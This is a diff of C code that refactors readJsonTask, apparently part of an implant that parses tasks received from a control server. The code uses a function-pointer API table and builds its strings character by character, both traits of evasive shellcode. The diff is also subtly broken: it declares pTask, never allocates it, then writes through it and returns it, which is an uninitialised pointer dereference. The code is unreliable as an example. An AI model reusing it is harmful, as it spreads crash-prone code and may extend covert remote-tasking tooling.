@@ -350,13 +350,13 @@ CHAR* myTrim(PAPI api, CCHAR* str, CHAR trim)
     return outStr;
 }
 
-typedef struct jsonTask
+typedef struct Task_
 {
     CHAR* taskId;
     CHAR* task;
     CHAR* taskType;
     CHAR* uuid;
-} JsonTask, *PJsonTask;
+} Task, *PTask;
 
 /*
 This function reads and parses a task in json format
@@ -383,7 +383,7 @@ Note:
     // TODO: This function can be improved by using a struct to hold the json
 
 */
-CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
+PTask readJsonTask(PAPI api, CHAR* json)
 {
     /*
     general structure of a json request
@@ -403,8 +403,9 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     ]
     */
 
+    PTask pTask;
+
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
-    CHAR* task;
     CHAR delim = { '\n' };
     CHAR blacklist[] = { '[', ']', '\0' };
     // tokenize json
@@ -436,7 +437,7 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     // remove spaces from the line
     trimmedToken1 = myTrim(api, token, ' ');
     // remove the comma
-    *taskId = myEndTrim(api, trimmedToken1, ',');
+    pTask->taskId = myEndTrim(api, trimmedToken1, ',');
 
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
@@ -445,16 +446,16 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
-    task = myTrim(api, trimmedToken2, '"');
+    pTask->task = myTrim(api, trimmedToken2, '"');
 
     #ifdef DEBUG
-    if (task == NULL)
+    if (pTask->task == NULL)
     {
         char fail_c[] = { 'T', 'a', 's', 'k', 'N', 'U', 'L', 'L', '\n', 0 };
         ((PRINTF)api->printf)(fail_c);
     }
     char task_c[] = { 'T', 'a', 's', 'k', ':' , ' ', '%', 's', '\n', 0 };
-    ((PRINTF)api->printf)(task_c, task);
+    ((PRINTF)api->printf)(task_c, pTask->task);
     char note_c[] = { 'N', 'o', 't', 'e', ':', ' ', '%', 's', '\n', 0 };
     char note_cr[] = { 'h', 'i', 0 };
     ((PRINTF)api->printf)(note_c, note_cr);
@@ -472,7 +473,7 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
-    *taskType = myTrim(api, trimmedToken2, '"');
+    pTask->taskType = myTrim(api, trimmedToken2, '"');
 
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
@@ -483,14 +484,14 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
-    *uuid = myTrim(api, trimmedToken2, '"');
+    pTask->uuid = myTrim(api, trimmedToken2, '"');
 
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
     ((FREE)api->free)(trimmedToken2);
     trimmedToken2 = NULL;
 
-    return task;
+    return pTask;
 }
 
 void myMain()
